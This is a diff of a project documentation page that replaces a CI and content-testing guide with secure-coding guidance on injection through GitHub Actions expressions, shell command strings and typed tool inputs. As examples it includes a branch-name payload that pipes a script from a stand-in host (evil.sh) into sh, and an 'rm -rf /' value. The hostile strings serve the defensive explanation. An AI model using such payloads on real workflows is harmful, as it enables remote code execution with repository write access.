@@ -16,7 +16,7 @@
 
     .site-nav > ul.nav-list:first-child > li > a,
     
-    .site-nav > ul.nav-list:first-child > li > ul > li:not(:nth-child(45)) > a,
+    .site-nav > ul.nav-list:first-child > li > ul > li:not(:nth-child(110)) > a,
     .site-nav > ul.nav-list:first-child > li > ul > li > ul > li a {
       background-image: none;
     }
@@ -26,14 +26,14 @@
       background-image: none;
     }
 
-    .site-nav > ul.nav-list:first-child > li:nth-child(14) > ul > li:nth-child(45) > a {
+    .site-nav > ul.nav-list:first-child > li:nth-child(14) > ul > li:nth-child(110) > a {
       font-weight: 600;
       text-decoration: none;
     }.site-nav > ul.nav-list:first-child > li:nth-child(14) > button svg,
-    .site-nav > ul.nav-list:first-child > li:nth-child(14) > ul > li:nth-child(45) > button svg {
+    .site-nav > ul.nav-list:first-child > li:nth-child(14) > ul > li:nth-child(110) > button svg {
       transform: rotate(-90deg);
     }.site-nav > ul.nav-list:first-child > li.nav-list-item:nth-child(14) > ul.nav-list,
-    .site-nav > ul.nav-list:first-child > li.nav-list-item:nth-child(14) > ul.nav-list > li.nav-list-item:nth-child(45) > ul.nav-list {
+    .site-nav > ul.nav-list:first-child > li.nav-list-item:nth-child(14) > ul.nav-list > li.nav-list-item:nth-child(110) > ul.nav-list {
       display: block;
     }
   </style>
@@ -53,20 +53,20 @@
 
 
   <!-- Begin Jekyll SEO tag v2.8.0 -->
-<title>Content Testing | folio-assistant</title>
+<title>Untrusted input | folio-assistant</title>
 <meta name="generator" content="Jekyll v3.10.0" />
-<meta property="og:title" content="Content Testing" />
+<meta property="og:title" content="Untrusted input" />
 <meta property="og:locale" content="en_US" />
 <meta name="description" content="Content-agnostic agent skills framework — author scientific papers, WHO SMART Guidelines, and FHIR Implementation Guides with an LLM, an MCP server, and a typed content-object model." />
 <meta property="og:description" content="Content-agnostic agent skills framework — author scientific papers, WHO SMART Guidelines, and FHIR Implementation Guides with an LLM, an MCP server, and a typed content-object model." />
-<link rel="canonical" href="https://litlfred.github.io/folio-assistant/reference/skill-instructions/content-test.html" />
-<meta property="og:url" content="https://litlfred.github.io/folio-assistant/reference/skill-instructions/content-test.html" />
+<link rel="canonical" href="https://litlfred.github.io/folio-assistant/reference/skill-instructions/untrusted-input.html" />
+<meta property="og:url" content="https://litlfred.github.io/folio-assistant/reference/skill-instructions/untrusted-input.html" />
 <meta property="og:site_name" content="folio-assistant" />
 <meta property="og:type" content="website" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="Content Testing" />
+<meta property="twitter:title" content="Untrusted input" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"WebPage","description":"Content-agnostic agent skills framework — author scientific papers, WHO SMART Guidelines, and FHIR Implementation Guides with an LLM, an MCP server, and a typed content-object model.","headline":"Content Testing","url":"https://litlfred.github.io/folio-assistant/reference/skill-instructions/content-test.html"}</script>
+{"@context":"https://schema.org","@type":"WebPage","description":"Content-agnostic agent skills framework — author scientific papers, WHO SMART Guidelines, and FHIR Implementation Guides with an LLM, an MCP server, and a typed content-object model.","headline":"Untrusted input","url":"https://litlfred.github.io/folio-assistant/reference/skill-instructions/untrusted-input.html"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -303,7 +303,7 @@
       <nav aria-label="Breadcrumb" class="breadcrumb-nav">
   <ol class="breadcrumb-nav-list">
     <li class="breadcrumb-nav-list-item"><a href="/folio-assistant/reference/skill-instructions/">Skill instructions</a></li>
-    <li class="breadcrumb-nav-list-item"><span>Content Testing</span></li>
+    <li class="breadcrumb-nav-list-item"><span>Untrusted input</span></li>
   </ol>
 </nav>
 
@@ -312,136 +312,214 @@
         <main>
           
             <blockquote class="note">
-  <p>Generated from <a href="https://github.com/litlfred/folio-assistant/blob/main/skills/content-lifecycle/content-test.md"><code class="language-plaintext highlighter-rouge">skills/content-lifecycle/content-test.md</code></a> — do not edit here. Typed contract: <a href="../skills/content-test.html">schema reference</a>.</p>
+  <p>Generated from <a href="https://github.com/litlfred/folio-assistant/blob/main/skills/folio-core/untrusted-input.md"><code class="language-plaintext highlighter-rouge">skills/folio-core/untrusted-input.md</code></a> — do not edit here.</p>
 
-  <p><a href="https://github.com/litlfred/folio-assistant/edit/main/skills/content-lifecycle/content-test.md" class="fa-edit-source">✎ Edit this page’s source</a></p>
+  <p><a href="https://github.com/litlfred/folio-assistant/edit/main/skills/folio-core/untrusted-input.md" class="fa-edit-source">✎ Edit this page’s source</a></p>
 </blockquote>
-<h1 id="content-testing">
+<h1 id="untrusted-input--the-value-must-never-become-program-text">
   
   
-    <a href="#content-testing" class="anchor-heading" aria-labelledby="content-testing"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Content Testing
+    <a href="#untrusted-input--the-value-must-never-become-program-text" class="anchor-heading" aria-labelledby="untrusted-input--the-value-must-never-become-program-text"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Untrusted input — the value must never become program text
   
   
 </h1>
     
 
-<p>End-to-end testing of content artifacts in realistic scenarios.</p>
-<h2 id="responsibilities">
-  
-  
-    <a href="#responsibilities" class="anchor-heading" aria-labelledby="responsibilities"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Responsibilities
-  
-  
-</h2>
-    
-<ul>
-  <li>Execute test plans and test scripts</li>
-  <li>Verify StructureMap extraction output (FHIR)</li>
-  <li>Verify CQL execution and measure calculations (FHIR)</li>
-  <li>Run Lean proof verification (formal math)</li>
-  <li><strong>Dispatch the repo’s Lean CI workflow on your branch and fold the result
-into the PR</strong> — see below; a local build is not CI green</li>
-  <li>Validate LaTeX compilation and output (formal math)</li>
-  <li>Test cross-component integration</li>
-  <li>Run regression tests against previous versions</li>
-  <li>Document test results</li>
-</ul>
-<h2 id="running-ci-not-just-assuming-it">
-  
-  
-    <a href="#running-ci-not-just-assuming-it" class="anchor-heading" aria-labelledby="running-ci-not-just-assuming-it"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Running CI, not just assuming it
-  
-  
-</h2>
-    
+<p>One defect, three substrates. In every case something <strong>substitutes a value
+into text that is then parsed as a program</strong>, and a value chosen by an attacker
+becomes code.</p>
 
-<p>A local <code class="language-plaintext highlighter-rouge">lake build</code> runs on a warm <code class="language-plaintext highlighter-rouge">.lake</code>, your toolchain, and whatever
-build flags you set. CI runs cold, on its own toolchain, with none of that.
-They fail differently, so a local green is evidence about your machine, not
-about the branch.</p>
-
-<p>So: push, then dispatch the workflow against your branch
-(<code class="language-plaintext highlighter-rouge">gh workflow run &lt;lean-ci&gt;.yml --ref &lt;branch&gt;</code>, or the <code class="language-plaintext highlighter-rouge">actions_run_trigger</code>
-MCP tool), wait for it, and record <strong>run URL + conclusion</strong> in the PR body.
-Red → fix and re-dispatch. If dispatch is refused for lack of <code class="language-plaintext highlighter-rouge">actions: write</code>,
-say so in the PR and give the command a maintainer should run — never leave it
-silently unmentioned.</p>
-
-<p>Also check <strong>when CI last ran</strong> (<code class="language-plaintext highlighter-rouge">actions_list</code> → <code class="language-plaintext highlighter-rouge">list_workflow_runs</code>). The
-existence of a workflow is not evidence that anything is being checked:
-qou’s <code class="language-plaintext highlighter-rouge">lean_ci.yml</code> last ran 2026-04-25 and failed on <code class="language-plaintext highlighter-rouge">main</code>. Nothing
-dispatched it for four months, and 37 modules stopped compiling unnoticed —
-several with plain parse errors, i.e. files that had never compiled at all.</p>
-<h2 id="a-green-build-only-covers-what-the-target-reaches">
+<div class="table-wrapper"><table>
+  <thead>
+    <tr>
+      <th>substrate</th>
+      <th>the substitution</th>
+      <th>the fix</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>GitHub Actions</td>
+      <td><code class="language-plaintext highlighter-rouge">${{ }}</code> is replaced in the script <strong>before the shell sees it</strong></td>
+      <td>bind to <code class="language-plaintext highlighter-rouge">env:</code>, read <code class="language-plaintext highlighter-rouge">$VAR</code></td>
+    </tr>
+    <tr>
+      <td>a shell command</td>
+      <td>building <code class="language-plaintext highlighter-rouge">"cmd " + arg</code></td>
+      <td>pass argv as an <strong>array</strong></td>
+    </tr>
+    <tr>
+      <td>a Tool input</td>
+      <td>a value that can contain <code class="language-plaintext highlighter-rouge">;</code> or <code class="language-plaintext highlighter-rouge">$(</code></td>
+      <td>a <strong>type that refuses it</strong></td>
+    </tr>
+  </tbody>
+</table></div>
+<h2 id="github-actions----is-not-interpolation-it-is-templating">
   
   
-    <a href="#a-green-build-only-covers-what-the-target-reaches" class="anchor-heading" aria-labelledby="a-green-build-only-covers-what-the-target-reaches"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> A green build only covers what the target reaches
+    <a href="#github-actions----is-not-interpolation-it-is-templating" class="anchor-heading" aria-labelledby="github-actions----is-not-interpolation-it-is-templating"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> GitHub Actions — <code class="language-plaintext highlighter-rouge">${{ }}</code> is not interpolation, it is templating
   
   
 </h2>
     
 
-<p>Before reading “build green” as a claim about the corpus, check what the build
-target actually compiles. Build systems default to <strong>narrow roots</strong>: Lake’s
-<code class="language-plaintext highlighter-rouge">lean_lib</code> uses <code class="language-plaintext highlighter-rouge">globs := roots.map Glob.one</code>, so <code class="language-plaintext highlighter-rouge">lake build</code> compiles the
-root module plus its transitive <code class="language-plaintext highlighter-rouge">import</code>s — not the source directory.
-<code class="language-plaintext highlighter-rouge">srcDir</code> widens where sources are <em>found</em>, never what is <em>built</em>.</p>
+<p>This is the one people get wrong because the syntax looks like a variable.
+<code class="language-plaintext highlighter-rouge">${{ github.event.pull_request.head.ref }}</code> is <strong>substituted into the script’s
+text</strong> before bash parses it. A branch named</p>
 
-<p>Measured in qou on 2026-08-08: <code class="language-plaintext highlighter-rouge">lake build</code> reached <strong>853 of the 1618</strong>
-modules under <code class="language-plaintext highlighter-rouge">lean/QOU/</code>. The other 766 (47%) had no olean at all — among
-them the module holding the single <code class="language-plaintext highlighter-rouge">sorry</code> gating the Specht chain, which is
-why the package build’s sorry-warning list omitted it.</p>
-
-<p>The check is cheap in any build system — count artifacts against sources:</p>
-
-<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find .lake/build/lib/lean/QOU <span class="nt">-name</span> <span class="s1">'*.olean'</span> | <span class="nb">wc</span> <span class="nt">-l</span>   <span class="c"># 860</span>
-find QOU <span class="nt">-name</span> <span class="s1">'*.lean'</span> | <span class="nb">wc</span> <span class="nt">-l</span>                         <span class="c"># 1618</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x";curl evil.sh|sh;"
 </code></pre></div></div>
 
-<p>A ratio far from 1 means the green is scoped, and <strong>any corpus-wide number
-read off that build — sorry counts, coverage, warning totals — is an
-undercount by construction.</strong> Say what the build covered, not just that it
-passed.</p>
-<h2 id="actors">
+<p>does not become a weird-looking string. It closes the quote and runs.</p>
+
+<p><strong>Bind it to <code class="language-plaintext highlighter-rouge">env:</code> and read it as a shell variable.</strong> Then bash receives the
+value as <em>data</em> and never parses it as program.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="na">env</span><span class="pi">:</span>
+        <span class="na">HEAD_REF</span><span class="pi">:</span> <span class="s">${{ github.event.pull_request.head.ref }}</span>
+      <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
+        <span class="s">BRANCH="$HEAD_REF"          # data, always</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">WorldHealthOrganization/smart-base</code> does exactly this across its
+slash-command workflows, with the comment <em>“Pass the branch name via env to
+avoid script injection from untrusted data”</em> — worth reading, since a DAK
+repository has the same fork-PR exposure this one does.</p>
+<h3 id="what-counts-as-attacker-controlled">
   
   
-    <a href="#actors" class="anchor-heading" aria-labelledby="actors"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Actors
+    <a href="#what-counts-as-attacker-controlled" class="anchor-heading" aria-labelledby="what-counts-as-attacker-controlled"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> What counts as attacker-controlled
+  
+  
+</h3>
+    
+
+<p>Not everything in <code class="language-plaintext highlighter-rouge">github.*</code>. The audit is worth doing precisely because most
+interpolations are fine and a blanket rule would be ignored.</p>
+
+<ul>
+  <li><strong>Attacker-controlled:</strong> <code class="language-plaintext highlighter-rouge">head.ref</code> (a fork’s branch name), PR/issue <strong>title</strong>
+and <strong>body</strong>, comment bodies, label names, and <strong>anything derived from them</strong> —
+including a <code class="language-plaintext highlighter-rouge">steps.*.outputs.*</code> that merely passed one through.</li>
+  <li><strong>Trusted:</strong> <code class="language-plaintext highlighter-rouge">github.workspace</code>, <code class="language-plaintext highlighter-rouge">github.repository_owner</code>, <code class="language-plaintext highlighter-rouge">github.sha</code>,
+<code class="language-plaintext highlighter-rouge">github.event_name</code>, <code class="language-plaintext highlighter-rouge">matrix.*</code>, and an output your own workflow <strong>sanitised</strong>.</li>
+</ul>
+
+<p><strong>The derived case is the one that hides.</strong> Measured here 2026-09-18: this
+repo’s staging workflow bound <code class="language-plaintext highlighter-rouge">head.ref</code> to <code class="language-plaintext highlighter-rouge">env</code> in one step, then wrote the
+<strong>raw</strong> branch to <code class="language-plaintext highlighter-rouge">$GITHUB_OUTPUT</code> and interpolated <code class="language-plaintext highlighter-rouge">steps.slug.outputs.branch</code>
+two steps later. The sanitised <code class="language-plaintext highlighter-rouge">slug</code> output beside it was safe; the <code class="language-plaintext highlighter-rouge">branch</code>
+output was the original value under a new name. <strong>Sanitise at the boundary or
+carry it in <code class="language-plaintext highlighter-rouge">env</code> the whole way — never both, half each.</strong></p>
+<h3 id="pull_request_target-is-where-this-stops-being-theoretical">
+  
+  
+    <a href="#pull_request_target-is-where-this-stops-being-theoretical" class="anchor-heading" aria-labelledby="pull_request_target-is-where-this-stops-being-theoretical"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> <code class="language-plaintext highlighter-rouge">pull_request_target</code> is where this stops being theoretical
+  
+  
+</h3>
+    
+
+<p>On <code class="language-plaintext highlighter-rouge">pull_request</code>, a fork PR gets a read-only token and no secrets, so an
+injection runs on the runner and little else. <strong><code class="language-plaintext highlighter-rouge">pull_request_target</code> runs with
+the base repository’s token and secrets.</strong> This repo’s staging-cleanup job ran
+on <code class="language-plaintext highlighter-rouge">pull_request_target: [closed]</code> with <code class="language-plaintext highlighter-rouge">contents: write</code> and interpolated a
+fork branch name — so closing a PR from a branch with a crafted name was
+arbitrary code execution with write access. Fixed the same day it was looked
+for; it had been there for as long as the workflow had.</p>
+
+<p>If a job runs on <code class="language-plaintext highlighter-rouge">pull_request_target</code>, treat every <code class="language-plaintext highlighter-rouge">github.event.*</code> field as
+hostile and check the whole job, not the line you came to change.</p>
+<h2 id="command-lines--argv-arrays-and-types-that-refuse-payloads">
+  
+  
+    <a href="#command-lines--argv-arrays-and-types-that-refuse-payloads" class="anchor-heading" aria-labelledby="command-lines--argv-arrays-and-types-that-refuse-payloads"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Command lines — argv arrays, and types that refuse payloads
   
   
 </h2>
     
+
+<p>Two lines of defence, and the order matters.</p>
+
+<p><strong>Second line: argv arrays.</strong> Never <code class="language-plaintext highlighter-rouge">exec("cmd " + arg)</code>. Spawn with an array,
+so the value is one word and no shell parses it. <code class="language-plaintext highlighter-rouge">src/mcp/project.ts</code> has no
+code path that produces a command <em>string</em> — a caller cannot hand one to a
+shell because it never has one to hand over.</p>
+
+<p><strong>First line, and the stronger one: the value cannot be dangerous.</strong> An argv
+array is a property of the <em>caller</em>, and a caller is one refactor away from a
+template literal. A constrained <strong>type</strong> survives that refactor:</p>
+
 <ul>
-  <li>QC Reviewer (lead)</li>
-  <li>FHIR Modeller (technical testing)</li>
-  <li>Business Analyst (scenario testing)</li>
+  <li><code class="language-plaintext highlighter-rouge">BeanStatus</code> is an enum. <code class="language-plaintext highlighter-rouge">"; rm -rf /"</code> is not a member.</li>
+  <li><code class="language-plaintext highlighter-rouge">BeanId</code> is <code class="language-plaintext highlighter-rouge">^[a-z0-9-]+$</code>. No space, no <code class="language-plaintext highlighter-rouge">;</code>, no <code class="language-plaintext highlighter-rouge">$(</code>, no backtick.</li>
+  <li><code class="language-plaintext highlighter-rouge">RepoPath</code> excludes shell metacharacters <strong>and <code class="language-plaintext highlighter-rouge">..</code> segments</strong> — traversal is
+the injection-shaped bug path types actually get hit with, and no amount of
+argv discipline prevents it.</li>
 </ul>
-<h2 id="inputs">
+
+<p>So: <strong>a Tool input that reaches argv may not reference an unconstrained type.</strong>
+<code class="language-plaintext highlighter-rouge">scripts/check-tools.ts</code> enforces it; <code class="language-plaintext highlighter-rouge">schemas/tool-types.ts</code> marks which types
+qualify.</p>
+<h3 id="free-prose-is-the-honest-exception">
   
   
-    <a href="#inputs" class="anchor-heading" aria-labelledby="inputs"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Inputs
+    <a href="#free-prose-is-the-honest-exception" class="anchor-heading" aria-labelledby="free-prose-is-the-honest-exception"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Free prose is the honest exception
+  
+  
+</h3>
+    
+
+<p>No pattern admits real markdown and excludes a payload. Rather than pretend,
+<code class="language-plaintext highlighter-rouge">Markdown</code> is <strong>not admissible as an argument</strong> — a Tool that needs free text
+declares <code class="language-plaintext highlighter-rouge">arg: { stdin: true }</code> and receives it on stdin, where it is data
+rather than a command-line word. A type that claimed to be safe and was not
+would be worse than one that says it isn’t, because the claim is what makes the
+next person skip the check.</p>
+<h2 id="a-workflow-github-cannot-parse-does-not-fail-loudly">
+  
+  
+    <a href="#a-workflow-github-cannot-parse-does-not-fail-loudly" class="anchor-heading" aria-labelledby="a-workflow-github-cannot-parse-does-not-fail-loudly"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> A workflow GitHub cannot parse does not fail loudly
   
   
 </h2>
     
-<ul>
-  <li>Approved content artifacts</li>
-  <li>Test plans and test data</li>
-  <li>Expected outcomes / golden files</li>
-</ul>
-<h2 id="outputs">
+
+<p>Worth knowing before you edit any workflow, and it is how the fix above nearly
+went wrong.</p>
+
+<p><strong>A run whose name is a FILE PATH rather than the workflow’s <code class="language-plaintext highlighter-rouge">name:</code> is a parse
+failure.</strong> GitHub had no <code class="language-plaintext highlighter-rouge">name:</code> to read. <code class="language-plaintext highlighter-rouge">AGENTS.md</code> records two workflows that
+sat red for a day in 2026-08 this way; adding the <code class="language-plaintext highlighter-rouge">env:</code> bindings above
+reproduced it, by putting a second <code class="language-plaintext highlighter-rouge">env:</code> on a step that already had one.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">yaml.safe_load</code> accepted the file.</strong> Duplicate keys are invalid YAML, but
+most loaders silently keep the last — so “it parses locally” is not evidence
+that GitHub will take it. <code class="language-plaintext highlighter-rouge">bun run check:workflows</code> uses a parser that reports
+duplicates (<code class="language-plaintext highlighter-rouge">yaml</code>’s <code class="language-plaintext highlighter-rouge">parseDocument</code> with <code class="language-plaintext highlighter-rouge">uniqueKeys</code>), and is gated in CI.</p>
+
+<p>Two hand-rolled attempts at that duplicate check reported false findings before
+the real parser went in — <code class="language-plaintext highlighter-rouge">types:</code> under two different triggers, then <code class="language-plaintext highlighter-rouge">run:</code> in
+two different steps. Both would have produced a wall of noise in a repository
+with no duplicates at all, which is exactly how a check gets switched off. YAML
+scoping is a parser’s job.</p>
+<h2 id="the-test-to-apply">
   
   
-    <a href="#outputs" class="anchor-heading" aria-labelledby="outputs"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Outputs
+    <a href="#the-test-to-apply" class="anchor-heading" aria-labelledby="the-test-to-apply"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> The test to apply
   
   
 </h2>
     
-<ul>
-  <li>Test results report</li>
-  <li>Coverage metrics</li>
-  <li>Regression comparison</li>
-  <li>Issue list (if failures)</li>
-</ul>
+
+<blockquote>
+  <p><strong>Is this value being placed into something that will be parsed?</strong></p>
+</blockquote>
+
+<p>If yes, it must arrive as data — <code class="language-plaintext highlighter-rouge">env</code>, argv, stdin — or be of a type that
+cannot express the parse. Quoting and escaping are what you reach for when
+neither is available, and they are the option that keeps failing.</p>
 
           
 
